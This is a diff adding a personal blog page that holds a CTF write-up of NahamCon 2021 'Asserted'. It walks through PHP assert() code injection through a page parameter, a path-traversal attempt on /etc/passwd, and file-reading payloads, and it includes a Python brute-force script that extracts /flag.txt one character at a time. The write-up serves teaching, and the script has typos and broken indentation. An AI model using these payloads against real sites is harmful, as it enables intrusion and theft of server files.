@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<title>Antoni Chrobot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Bootstrap -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto'>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/atelier-forest-dark.min.css" integrity="sha512-bHrTOKTYdBppORvOCgGWhwUt68kqsl5e9cemM/7hf1uehwPUjtAiGyXzcoBFRN3SnktP0582tbAzkPPMWVTgVQ==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link rel="stylesheet" href="../style.css">
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif}
+</style>
+
+<body>
+
+<!-- Page Container -->
+<div class="container-fluid px-5">
+
+<!-- navbar  -->
+<nav class="navbar navbar-expand-lg topnav mt-1 mb-3 p-0">
+    	
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+    <span class="navbar-toggler-icon">
+    <i class="fa fa-navicon" style="color: white"></i>
+    </span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="collapsibleNavbar">
+    	
+    <ul class="navbar-nav">
+	<li class="nav-item">
+	    <a class="navlink" href="../index.html">Home</a>
+	</li>
+	<li class="nav-item">
+	    <a class="navlink" href="../projects.html">Projects</a>
+	</li>
+	<li class="nav-item">
+	    <a class="active navlink" href="../ctf.html">CTF</a>
+	</li>
+    </ul>
+
+    </div>
+</nav>
+<!-- end navbar  -->
+	
+
+<div class="row justify-content-center"> 
+
+    <div class="col-12 col-xl-9">
+
+    <div class="w3-display-container w3-container gray-bg w3-card  w3-margin-bottom">
+
+	<!-- CONTENT GOES HERE -->
+
+	<h2 class="title mb-2">NahamCon CTF 2021: Asserted</h2>
+	<div class="meta mb-3">
+	<span class="date">March 2021</span>
+	</div>
+	<hr>
+
+
+	<h1>Challenge</h1>
+
+	<p>Prompt: 
+	<a href="../images/nahamconctf-2021/assert/prompt.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/prompt.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p>We are given a link to webpage. It brings us to a website for a gym. There are several different pages such as About, Contact, Blog, etc.</p>
+
+	<p>The page is selected by setting a GET parameter in the url:
+	<a href="../images/nahamconctf-2021/assert/page-param.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/page-param.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p>My first thought was Local File Inclusion, so I tried setting the page parameter to <code>../../../etc/passwd</code>. This did not work and I got the following response: 
+	<a href="../images/nahamconctf-2021/assert/hacking-detected-page.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/hacking-detected-page.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p>There must be some filter checking if the page parameter contains <code>..</code></p>
+
+	<p>With the name of the challenge being <code>assert</code>, I decided to look into vulnerabilities related to PHP's <code>assert</code> function. It seems as though index.php uses the assert function in conjuction with <code>strpos</code>, or a similar function, to check if the page parameter contains the malicious characters.</p>
+
+	<p>I made an assumption that the PHP code looked something like this:
+	<pre><code>
+	assert("strpos($_GET['page'], '..')===false") or die('HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE')
+	</code></pre></p>
+
+	<p>I tested this assumption by sending the payload:
+	<pre><code>
+	?page=a','b')===false &amp;&amp; strpos('
+	</code></pre>
+	I URL encoded this payload and made a request with the page parameter set to this payload. With this payload being executed by the PHP script, the assert statement will always evaluate to true</p>
+
+	<p>I sent the request and I got a response with status code 200 and no message saying "HACKING ATTEMPT ... " 
+	<a href="../images/nahamconctf-2021/assert/test-assert-assumption2.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/test-assert-assumption2.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p>Just to double check my assumption, I sent a payload that would evaluate to false:
+	<pre><code>
+	?page=a','a')===false &amp;&amp; strpos('
+	</code></pre>
+	and observed that I got the "HACKING ATTEMPT ..." message.
+	<a href="../images/nahamconctf-2021/assert/test-assert-assumption1.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/test-assert-assumption1.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p>At this point I have verified that I can inject PHP boolean expressions, and if the expression evaluates to true I will get no error, and if the expression evaluate to false I will get the "HACKING ATTEMPT ..." message in the response.</p>
+
+	<p>I used the following payload to see if I can read from the <code>flag.txt</code> file:
+	<pre><code>
+	?page=a','b')===false &amp;&amp; strpos(file_get_contents('/flag.txt'), 'flag{')!==flase &amp;&amp; strpos('
+	</code></pre></p>
+
+	<p>
+	<a href="../images/nahamconctf-2021/assert/test-payload1.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/test-payload1.png" alt="png" title="" />
+	</a>
+	This request did not return the warning message. The following payload, however, did return the warning message:</p>
+
+	<p>
+	<a href="../images/nahamconctf-2021/assert/test-payload2.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/test-payload2.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<p><pre><code>
+	?page=a','b')===false &amp;&amp; strpos(file_get_contents('/flag.txt'), 'flag{a')!==flase &amp;&amp; strpos('
+	</code></pre></p>
+
+	<p>Next I wrote a python script to automate the checking of potential flag strings.
+	To summarize the script, I send continuous requests with my payload, where I check against a different substring's existence in <code>flag.txt</code>. If I get a response with no warning message, I know that my substring exists in flag.txt, and this way I can build out each character in the flag.</p>
+
+	<pre><code class="python">import requests
+import string
+
+session = requests.Session()
+
+url = 'http://challenge.nahamcon.com:30735/index.php?page='
+
+flag = 'flag{'
+
+while '}' not in flag:
+    for c in string.hexdigits.lower() + '}':
+	payload = f"','qwer')===false+%26%26+strpos(file<em>get</em>contents('/flag.txt'),'{flag+c}')!==false+%26%26+strpos('abc"
+	endpoint = url + payload
+	r = session.get(endpoint)
+
+if 'HACKING' not in r.text:
+	flag += c
+	print(flag)
+	</code></pre>
+
+
+	<p>
+	<a href="../images/nahamconctf-2021/assert/script-output.png" alt="png" >
+	<img class="blog-img" src="../images/nahamconctf-2021/assert/script-output.png" alt="png" title="" />
+	</a>
+	</p>
+
+	<!-- END CONTENT -->
+
+
+    </div> <!-- End display container -->
+    </div> <!-- End columns -->
+</div> <!-- End row -->
+
+<!-- footer for small devices -->
+<footer class="fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+</footer>
+
+
+<!-- Footer for large devices -->
+<footer class="d-none d-xl-block fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+  <p class="m-0">Find me on social media.</p> 
+  
+</footer>
+
+</body>
+</html>
+
+
